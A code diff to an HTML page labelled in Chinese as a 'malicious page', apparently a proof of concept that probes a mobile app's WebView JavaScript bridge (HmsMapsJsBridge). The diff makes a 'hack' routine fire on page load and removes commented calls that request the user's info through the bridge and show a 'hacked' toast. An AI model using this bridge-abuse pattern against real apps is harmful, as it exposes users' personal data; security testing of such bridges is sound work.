@@ -21,10 +21,6 @@
             margin-top: 20px;
         }
     </style>
-</head>
-<body>
-    <h1 id="text">恶意页面 2</h1>
-
     <script>
         window.onload = function() {
             var hack = function() {
@@ -39,20 +35,14 @@
                     alert('执行出错' + error.message);
                 }
             }
+            hack();
             
         }
-        // function getAT() {
-        //     // document.getElementById("text").innerText = "文本已被修改！";
-        //     let str = "{'type':'getUserInfo', 'msgId':10086}";
-        //     let ret = await window.HmsMapsJsBridge.postMessage(str);
-        //     document.getElementById("text").innerText = ret;
-        // }
-        // function toast() {
-        //     let str = "{'type':'toast', 'msgId':10086, 'data':{'message':'hacked by SilverNeedle😄'}}";
-        //     let ret = await window.HmsMapsJsBridge.postMessage(str);
-        // }
 
 
     </script>
+</head>
+<body>
+    <h1 id="text">恶意页面 3</h1>
 </body>
 </html>
